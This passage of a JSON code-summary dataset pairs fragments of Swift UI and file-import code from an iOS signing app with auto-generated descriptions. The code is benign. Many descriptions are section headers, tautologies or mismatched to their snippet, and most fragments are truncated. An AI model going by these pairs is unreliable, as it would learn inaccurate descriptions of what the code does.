    "code_type": "function"
  },
  {
    "id": "2420",
    "code": "@objc private func buttonTapped() {\n// Provide haptic feedback\nfeedbackGenerator.impactOccurred()\n\n// Call the callback\nonTap?()\n}\n\n// MARK: - Lifecycle\n",
    "nl": "Function buttonTapped - implements buttontapped functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2421",
    "code": "override func layoutSubviews() {\nsuper.layoutSubviews()\ngradientLayer.frame = bounds\n}\n}\n\n// Helper color extensions - only isLight() is needed here since lighter/darker are already defined\n// Use fileprivate to avoid conflicts with other extensions\nprivate extension UIColor {",
    "nl": "MARK: - Lifecycle",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2422",
    "code": "private extension UIColor {\nfunc isLight() -> Bool {",
    "nl": "Helper color extensions - only isLight() is needed here since lighter/darker are already defined Use fileprivate to avoid conflicts with other extensions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "2423",
    "code": "func isLight() -> Bool {\nvar red: CGFloat = 0, green: CGFloat = 0, blue: CGFloat = 0, alpha: CGFloat = 0\ngetRed(&red, green: &green, blue: &blue, alpha: &alpha)\n\n// Calculate relative luminance\nlet luminance = 0.2126 * red + 0.7152 * green + 0.0722 * blue\nreturn luminance > 0.5\n}\n}\n",
    "nl": "Function isLight - checks if light",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2424",
    "code": "private func isColorLight(_ color: UIColor) -> Bool {\nvar red: CGFloat = 0, green: CGFloat = 0, blue: CGFloat = 0, alpha: CGFloat = 0\ncolor.getRed(&red, green: &green, blue: &blue, alpha: &alpha)\n\n// Calculate relative luminance\nlet luminance = 0.2126 * red + 0.7152 * green + 0.0722 * blue\nreturn luminance > 0.5\n}\n",
    "nl": "Helper method to keep original functionality but avoid extension conflicts",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2425",
    "code": "class StartupPopupViewController: UIViewController {\n// MARK: - UI Components\n\nprivate let contentView = UIView()\nprivate let titleLabel = UILabel()\nprivate let messageLabel = UILabel()\nprivate let iconImageView = UIImageView()\nprivate let progressView = UIProgressView()\nprivate let secondsRemainingLabel = UILabel()\n",
    "nl": "/ A popup that displays for exactly 5 seconds on first app launch",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/StartupPopupViewController.swift",
    "code_type": "class"
  },
  {
    "id": "2426",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\nsetupUI()\n// Make sure the view is properly accessible\nview.isUserInteractionEnabled = true\nview.accessibilityIdentifier = \"StartupPopupView\"\n}\n\noverride func viewDidAppear(_ animated: Bool) {",
    "nl": "MARK: - Lifecycle",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/StartupPopupViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2427",
    "code": "override func viewDidAppear(_ animated: Bool) {\nsuper.viewDidAppear(animated)\n\n// Start the timer when the view appears\nstartTime = Date()\nstartProgressTimer()\n\n// Schedule automatic dismissal after exactly 5 seconds\nDispatchQueue.main.asyncAfter(deadline: .now() + displayDuration) { [weak self] in",
    "nl": "Function viewDidAppear - implements viewdidappear functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/StartupPopupViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2428",
    "code": "override func viewWillDisappear(_ animated: Bool) {\nsuper.viewWillDisappear(animated)\n// Always invalidate timer to prevent leaks\ntimer?.invalidate()\ntimer = nil\n}\n\ndeinit {",
    "nl": "Function viewWillDisappear - implements viewwilldisappear functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/StartupPopupViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2429",
    "code": "private func setupUI() {\n// Main view configuration - semi-transparent black background\nview.backgroundColor = UIColor.black.withAlphaComponent(0.7)\n\n// Content view setup - white card with shadow\ncontentView.backgroundColor = .systemBackground\ncontentView.layer.cornerRadius = 16\ncontentView.layer.shadowColor = UIColor.black.cgColor\ncontentView.layer.shadowOpacity = 0.3\ncontentView.layer.shadowOffset = CGSize(width: 0, height: 4)",
    "nl": "MARK: - UI Setup",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/StartupPopupViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2430",
    "code": "private func setupConstraints() {\ncontentView.translatesAutoresizingMaskIntoConstraints = false\niconImageView.translatesAutoresizingMaskIntoConstraints = false\ntitleLabel.translatesAutoresizingMaskIntoConstraints = false\nmessageLabel.translatesAutoresizingMaskIntoConstraints = false\nprogressView.translatesAutoresizingMaskIntoConstraints = false\nsecondsRemainingLabel.translatesAutoresizingMaskIntoConstraints = false\n\nNSLayoutConstraint.activate([\n// Content view constraints - centered with fixed width",
    "nl": "Function setupConstraints - sets upconstraints",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/StartupPopupViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2431",
    "code": "private func startProgressTimer() {\n// Update progress every 0.1 seconds\ntimer = Timer.scheduledTimer(withTimeInterval: 0.1, repeats: true) { [weak self] _ in",
    "nl": "MARK: - Timer Management",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/StartupPopupViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2432",
    "code": "private func dismissPopup() {\n// Check if dismissal is already in progress to prevent multiple calls\nguard !dismissInProgress else { return }",
    "nl": "Function dismissPopup - implements dismisspopup functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/StartupPopupViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2433",
    "code": "@objc func handleDismissTap() {\ndismissPopup()\n}\n\n// MARK: - Overrides\n\noverride func touchesBegan(_ touches: Set<UITouch>, with _: UIEvent?) {",
    "nl": "MARK: - Actions Add a method to manually dismiss if needed",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/StartupPopupViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2434",
    "code": "override func touchesBegan(_ touches: Set<UITouch>, with _: UIEvent?) {\n// Allow touches only on certain areas if needed\nif let touch = touches.first {",
    "nl": "MARK: - Overrides",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/StartupPopupViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2435",
    "code": "struct TransferPreview: View {\n@Environment(\\.presentationMode) var presentationMode\n\n@StateObject private var installer: Installer\n\n@State private var appPath: String\n@State private var appName: String\n@State private var isSharing: Bool = false\n\n@State private var packaging: Bool = true",
    "nl": "struct TransferPreview - implements functionality related to transfer preview",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Previews/TransferPreview.swift",
    "code_type": "struct"
  },
  {
    "id": "2436",
    "code": "func archivePayload(at filePath: String, with fileName: String, completion: @escaping (URL?) -> Void) {\nDispatchQueue.global(qos: .userInitiated).async {",
    "nl": "Function archivePayload - implements archivepayload functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Previews/TransferPreview.swift",
    "code_type": "function"
  },
  {
    "id": "2437",
    "code": "struct ActivityViewController: UIViewControllerRepresentable {\nvar activityItems: [Any]\nvar applicationActivities: [UIActivity]?\n\nfunc makeUIViewController(context _: UIViewControllerRepresentableContext<Self>) -> UIActivityViewController {",
    "nl": "struct ActivityViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Previews/TransferPreview.swift",
    "code_type": "struct"
  },
  {
    "id": "2438",
    "code": "func makeUIViewController(context _: UIViewControllerRepresentableContext<Self>) -> UIActivityViewController {\nreturn UIActivityViewController(activityItems: activityItems, applicationActivities: applicationActivities)\n}\n\nfunc updateUIViewController(_: UIActivityViewController, context _: UIViewControllerRepresentableContext<Self>) {}",
    "nl": "Function makeUIViewController - implements makeuiviewcontroller functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Previews/TransferPreview.swift",
    "code_type": "function"
  },
  {
    "id": "2439",
    "code": "func updateUIViewController(_: UIActivityViewController, context _: UIViewControllerRepresentableContext<Self>) {}\n}\n\nstruct SafariWebView: UIViewControllerRepresentable {",
    "nl": "Function updateUIViewController - updates uiviewcontroller",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Previews/TransferPreview.swift",
    "code_type": "function"
  },
  {
    "id": "2440",
    "code": "struct SafariWebView: UIViewControllerRepresentable {\nlet url: URL\n\nfunc makeUIViewController(context _: Context) -> SFSafariViewController {",
    "nl": "struct SafariWebView - UI component for display and interaction",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Previews/TransferPreview.swift",
    "code_type": "struct"
  },
  {
    "id": "2441",
    "code": "func makeUIViewController(context _: Context) -> SFSafariViewController {\nreturn SFSafariViewController(url: url)\n}\n\nfunc updateUIViewController(_: SFSafariViewController, context _: Context) {",
    "nl": "Function makeUIViewController - implements makeuiviewcontroller functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Previews/TransferPreview.swift",
    "code_type": "function"
  },
  {
    "id": "2442",
    "code": "func updateUIViewController(_: SFSafariViewController, context _: Context) {\n//\n}\n}\n",
    "nl": "Function updateUIViewController - updates uiviewcontroller",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Previews/TransferPreview.swift",
    "code_type": "function"
  },
  {
    "id": "2443",
    "code": "extension DirectoryViewController {\n/// Initialize with a directory URL and title\n/// - Parameters:\n///   - directoryURL: The URL of the directory to display\n///   - title: The title to display in the navigation bar\nconvenience init(directoryURL: URL, title: String) {",
    "nl": "extension DirectoryViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/DirectoryViewController+Initialization.swift",
    "code_type": "extension"
  },
  {
    "id": "2444",
    "code": "class DirectoryViewController: HomeViewController {\n// MARK: - Properties\n\n/// The directory URL this controller is showing\nprivate var directoryURL: URL\n\n/// Callback to notify parent when changes occur\nvar onContentChanged: (() -> Void)?\n\n// MARK: - Initialization",
    "nl": "class DirectoryViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/DirectoryViewController.swift",
    "code_type": "class"
  },
  {
    "id": "2445",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\nsetupFileManagementUI() // Call the setup method from the extension\n}\n\n// MARK: - Overrides\n\n/// Override documentsDirectory to use the specified directory URL\noverride var documentsDirectory: URL {",
    "nl": "MARK: - Lifecycle",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/DirectoryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2446",
    "code": "override func viewWillAppear(_ animated: Bool) {\nsuper.viewWillAppear(animated)\nloadFiles()\n}\n}\n",
    "nl": "/ Reload content when returning to view",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/DirectoryViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2447",
    "code": "extension DirectoryViewController {\n/// Set up the file management UI elements\nfunc setupFileManagementUI() {",
    "nl": "MARK: - Extensions to provide all-in-one comprehensive file management",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/DirectoryViewControllerExtensions.swift",
    "code_type": "extension"
  },
  {
    "id": "2448",
    "code": "func setupFileManagementUI() {\n// Add edit button for quick file creation\nnavigationItem.rightBarButtonItem = UIBarButtonItem(\nbarButtonSystemItem: .add,\ntarget: self,\naction: #selector(showAddFileOptions)\n)\n}\n\n@objc private func showAddFileOptions() {",
    "nl": "/ Set up the file management UI elements",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/DirectoryViewControllerExtensions.swift",
    "code_type": "function"
  },
  {
    "id": "2449",
    "code": "@objc private func showAddFileOptions() {\nlet alertController = UIAlertController(\ntitle: \"Add New\",\nmessage: \"What would you like to create?\",\npreferredStyle: .actionSheet\n)\n\n// New folder option\nlet folderAction = UIAlertAction(title: \"New Folder\", style: .default) { [weak self] _ in",
    "nl": "Function showAddFileOptions - implements showaddfileoptions functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/DirectoryViewControllerExtensions.swift",
    "code_type": "function"
  },
  {
    "id": "2450",
    "code": "private func takePhoto() {\nif UIImagePickerController.isSourceTypeAvailable(.camera) {",
    "nl": "/ Take a photo and save it to the current directory",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/DirectoryViewControllerExtensions.swift",
    "code_type": "function"
  },
  {
    "id": "2451",
    "code": "extension DirectoryViewController: UIImagePickerControllerDelegate, UINavigationControllerDelegate {\nfunc imagePickerController(\n_ picker: UIImagePickerController,\ndidFinishPickingMediaWithInfo info: [UIImagePickerController.InfoKey: Any]\n) {",
    "nl": "MARK: - UIImagePickerControllerDelegate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/DirectoryViewControllerExtensions.swift",
    "code_type": "extension"
  },
  {
    "id": "2452",
    "code": "func imagePickerController(\n_ picker: UIImagePickerController,\ndidFinishPickingMediaWithInfo info: [UIImagePickerController.InfoKey: Any]\n) {",
    "nl": "Function imagePickerController - implements imagepickercontroller functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/DirectoryViewControllerExtensions.swift",
    "code_type": "function"
  },
  {
    "id": "2453",
    "code": "extension HomeViewController {\n/// Enhanced file import function with improved security-scoped resource handling\n@objc func enhancedImportFile() {",
    "nl": "/ Extension to fix file upload functionality in Home tab",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController+FileUploadFix.swift",
    "code_type": "extension"
  },
  {
    "id": "2454",
    "code": "@objc func enhancedImportFile() {\n// Improved security-scoped resource access with proper feedback\nlet documentTypes = [\nUTType.item,\nUTType.content,\nUTType.compositeContent,\nUTType.archive,\nUTType.zip,\nUTType.data,\n]",
    "nl": "/ Enhanced file import function with improved security-scoped resource handling",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController+FileUploadFix.swift",
    "code_type": "function"
  },
  {
    "id": "2455",
    "code": "private func addLEDEffectsToDocumentPicker(_ picker: UIDocumentPickerViewController) {\n// We need to wait until the picker is presented to apply effects\nDispatchQueue.main.asyncAfter(deadline: .now() + 0.5) {",
    "nl": "/ Apply LED effects to document picker for better visibility",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController+FileUploadFix.swift",
    "code_type": "function"
  },
  {
    "id": "2456",
    "code": "func documentPickerExtension(_: UIDocumentPickerViewController, didPickDocumentsAt urls: [URL]) {\n// Enable activity indicator to show loading state\nactivityIndicator.startAnimating()\n\n// Process documents in background to keep UI responsive\nDispatchQueue.global(qos: .userInitiated).async { [weak self] in",
    "nl": "/ Fixed implementation for document picker delegate method Renamed to avoid conflict with base implementation",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController+FileUploadFix.swift",
    "code_type": "function"
  },
  {
    "id": "2457",
    "code": "private func processImportedFile(url: URL) throws {\n// Get a unique filename that won't conflict with existing files\nlet fileName = HomeViewController.getUniqueFileNameShared(for: url.lastPathComponent)\nlet destinationURL = documentsDirectory.appendingPathComponent(fileName)\n\nDebug.shared.log(message: \"Processing import: \\(url.path) to \\(destinationURL.path)\", type: .info)\n\n// Create files directory if needed\ntry FileManager.default.createDirectory(\nat: documentsDirectory,",
    "nl": "/ Process a single imported file",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController+FileUploadFix.swift",
    "code_type": "function"
  },
  {
    "id": "2458",
    "code": "private func showLEDSuccessMessage(count: Int) {\nlet message = count == 1 ? \"File imported successfully\" : \"\\(count) files imported successfully\"\nshowLEDIndicator(type: .success, message: message)\n}\n\n/// Show an error message with LED effect\nprivate func showLEDErrorMessage(failures: [String]) {",
    "nl": "/ Show a success message with LED effect",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController+FileUploadFix.swift",
    "code_type": "function"
  },
  {
    "id": "2459",
    "code": "private func showLEDErrorMessage(failures: [String]) {\nlet message = failures\n.count == 1 ? \"Failed to import file: \\(failures.first ?? \"\")\" : \"Failed to import \\(failures.count) files\"\nshowLEDIndicator(type: .error, message: message)\n\n// For multiple failures, also show a detailed report\nif failures.count > 1 {",
    "nl": "/ Show an error message with LED effect",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController+FileUploadFix.swift",
    "code_type": "function"
  },
  {
    "id": "2460",
    "code": "private func showLEDMixedResultMessage(successes: Int, failures: Int) {\nlet message = \"Imported \\(successes) files successfully, \\(failures) failed\"\nshowLEDIndicator(type: .warning, message: message)\n}\n\n/// Show an LED indicator with message\nprivate func showLEDIndicator(type: LEDIndicatorType, message: String) {",
    "nl": "/ Show a mixed result message with LED effect",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController+FileUploadFix.swift",
    "code_type": "function"
  },
  {
    "id": "2461",
    "code": "private func showLEDIndicator(type: LEDIndicatorType, message: String) {\n// Create container view\nlet container = UIView()\ncontainer.backgroundColor = type.backgroundColor\ncontainer.alpha = 0\ncontainer.layer.cornerRadius = 10\ncontainer.translatesAutoresizingMaskIntoConstraints = false\nview.addSubview(container)\n\n// Create message label",
    "nl": "/ Show an LED indicator with message",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController+FileUploadFix.swift",
    "code_type": "function"
  },
  {
    "id": "2462",
    "code": "@objc func enhancedImportFileMethod() {\nenhancedImportFile()\n}\n}\n\n// Using the LED effect from UIView+LED extension instead\nextension HomeViewController {",
    "nl": "/ Alternative implementation of importFile",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController+FileUploadFix.swift",
    "code_type": "function"
  },
  {
    "id": "2463",
    "code": "extension HomeViewController {\nfunc showUploadStatusIndicator(type: UploadStatus) {",
    "nl": "Using the LED effect from UIView+LED extension instead",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController+FileUploadFix.swift",
    "code_type": "extension"
  },
  {
    "id": "2464",
    "code": "func showUploadStatusIndicator(type: UploadStatus) {\nlet color: UIColor\nswitch type {",
    "nl": "Function showUploadStatusIndicator - implements showuploadstatusindicator functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController+FileUploadFix.swift",
    "code_type": "function"
  },
  {
    "id": "2465",
    "code": "enum UploadStatus {\ncase success\ncase error\ncase warning\ncase info\n\nvar glowColor: UIColor {",
    "nl": "enum UploadStatus - implements functionality related to upload status",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController+FileUploadFix.swift",
    "code_type": "enum"
  },
  {
    "id": "2466",
    "code": "class HomeViewController: UIViewController, UISearchResultsUpdating, UIDocumentPickerDelegate, FileHandlingDelegate,\nUITableViewDelegate, UITableViewDataSource, UITableViewDragDelegate, UITableViewDropDelegate\n{",
    "nl": "MARK: - HomeViewController - Core Component This file is the main view controller for file operations",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift",
    "code_type": "class"
  },
  {
    "id": "2467",
    "code": "enum SortOrder: String {\ncase name, date, size\n}\n\nvar activityIndicator: UIActivityIndicatorView {",
    "nl": "enum SortOrder - implements functionality related to sort order",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift",
    "code_type": "enum"
  },
  {
    "id": "2468",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\nsetupUI()\nsetupActivityIndicator()\nloadFiles()\nconfigureTableView()\n}\n\ndeinit {",
    "nl": "MARK: - Lifecycle",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2469",
    "code": "private func setupUI() {\nview.backgroundColor = UIColor.systemBackground.withAlphaComponent(0.9)\nview.layer.applyFuturisticShadow()\n\nlet navItem = UINavigationItem(title: \"File Nexus\")\nlet menuButton = UIBarButtonItem(\nimage: UIImage(systemName: \"ellipsis.circle.fill\"),\nstyle: .plain,\ntarget: self,\naction: #selector(showMenu)",
    "nl": "MARK: - UI Setup",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2470",
    "code": "@objc func applyFuturisticEffect() {\n// Create a snapshot of the current view\nguard let snapshot = view.snapshotView(afterScreenUpdates: false) else { return }",
    "nl": "/ Applies a futuristic transition effect to the view",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2471",
    "code": "private func setupActivityIndicator() {\nview.addSubview(activityIndicator)\nNSLayoutConstraint.activate([\nactivityIndicator.centerXAnchor.constraint(equalTo: view.centerXAnchor),\nactivityIndicator.centerYAnchor.constraint(equalTo: view.centerYAnchor),\n])\n}\n\nprivate func configureTableView() {",
    "nl": "Function setupActivityIndicator - sets upactivityindicator",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2472",
    "code": "private func configureTableView() {\nHomeViewUI.fileListTableView.delegate = self\nHomeViewUI.fileListTableView.dataSource = self\nHomeViewUI.fileListTableView.dragDelegate = self\nHomeViewUI.fileListTableView.dropDelegate = self\nHomeViewUI.fileListTableView.register(FileTableViewCell.self, forCellReuseIdentifier: \"FileCell\")\nHomeViewUI.fileListTableView.backgroundColor = .clear\nHomeViewUI.fileListTableView.layer.cornerRadius = 15\nHomeViewUI.fileListTableView.layer.applyFuturisticShadow()\n}",
    "nl": "Function configureTableView - implements configuretableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2473",
    "code": "private func createFilesDirectoryIfNeeded(at directory: URL) -> Bool {\n// Check if directory already exists\nif fileManager.fileExists(atPath: directory.path) {",
    "nl": "Function createFilesDirectoryIfNeeded - creates filesdirectoryifneeded",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2474",
    "code": "private func saveState() {\nUserDefaults.standard.set(sortOrder.rawValue, forKey: \"sortOrder\")\n}\n\n// MARK: - File Operations\n\n/// Loads files from the documents directory and updates the UI\nfunc loadFiles() {",
    "nl": "Function saveState - implements savestate functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2475",
    "code": "func loadFiles() {\n// Start loading indicator\nactivityIndicator.startAnimating()\n\n// Ensure the documents directory exists before trying to load files\nif !createFilesDirectoryIfNeeded(at: documentsDirectory) {",
    "nl": "MARK: - File Operations / Loads files from the documents directory and updates the UI",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2476",
    "code": "private func showEmptyStateMessage(withError error: Error? = nil) {\n// Check if we already have an empty state label\nif let existingLabel = view.viewWithTag(1001) as? UILabel {",
    "nl": "/ Shows a message when the file list is empty / - Parameter error: Optional error to show",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2477",
    "code": "private func hideEmptyStateMessage() {\nif let emptyLabel = view.viewWithTag(1001) {",
    "nl": "/ Hides the empty state message",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2478",
    "code": "@objc func addDirectory() {\nlet alertController = UIAlertController(\ntitle: \"Add Directory\",\nmessage: \"Enter the name of the new directory\",\npreferredStyle: .alert\n)\nalertController.addTextField { textField in",
    "nl": "/ Creates a new directory",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2479",
    "code": "@objc func importFile() {\nfileHandlers.importFile(viewController: self)\n}\n\n@objc func performFileImport() {",
    "nl": "/ Initiates the file import process",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2480",
    "code": "@objc func performFileImport() {\nfileHandlers.importFile(viewController: self)\n}\n\n/// Handles a file that has been imported from outside the app\n/// - Parameter url: The URL of the imported file\nfunc handleImportedFile(url: URL) {",
    "nl": "Function performFileImport - implements performfileimport functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2481",
    "code": "func handleImportedFile(url: URL) {\n// Show loading indicator\nactivityIndicator.startAnimating()\n\n// Generate a unique name if a file with the same name exists\nlet fileName = Self.getUniqueFileNameShared(for: url.lastPathComponent)\nlet destinationURL = documentsDirectory.appendingPathComponent(fileName)\n\nDebug.shared.log(message: \"Importing file from \\(url.path) to \\(destinationURL.path)\", type: .info)\n",
    "nl": "/ Handles a file that has been imported from outside the app / - Parameter url: The URL of the imported file",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2482",
    "code": "static func getUniqueFileNameShared(for filename: String) -> String {\n// Get the documents directory in a static-friendly way\nlet fileManager = FileManager.default\nguard let documentsDir = fileManager.urls(for: .documentDirectory, in: .userDomainMask).first?\n.appendingPathComponent(\"files\")\nelse {",
    "nl": "/ Generates a unique filename if the original already exists / - Parameter filename: The original filename / - Returns: A unique filename Static version of getUniqueFileName - fully implemented to avoid instance member access",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2483",
